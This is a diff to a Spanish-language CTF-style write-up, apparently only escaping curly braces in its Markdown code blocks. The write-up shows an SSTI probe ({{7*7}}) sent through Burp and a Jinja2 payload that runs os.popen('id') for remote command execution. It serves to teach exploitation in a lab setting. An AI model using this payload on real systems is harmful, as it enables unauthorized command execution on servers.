@@ -262,7 +262,7 @@ Vamos a probar si es vulnerable a SSTI. Mandaremos el siguiente payload desde Bu
 ```json
 {
 	"to":"172.18.0.1",
-	 "message":"Test message sent by {{7*7}}"
+	 "message":"Test message sent by \{\{7\*7\}\}"
 	}
 ```
 
@@ -273,7 +273,7 @@ Si nos llega un 49, es vulnerable a SSTI y puede que podamos ejecutar comandos a
 Es vulnerable a inyección de plantillas. Vamos a probar un payload tipico para explotar un RCE.
 
 ```python
-{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+\{\{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() \}\}
 ```
 
 Si tratamos de enviar eso, podemos ver que recibimos la siguiente respuesta...
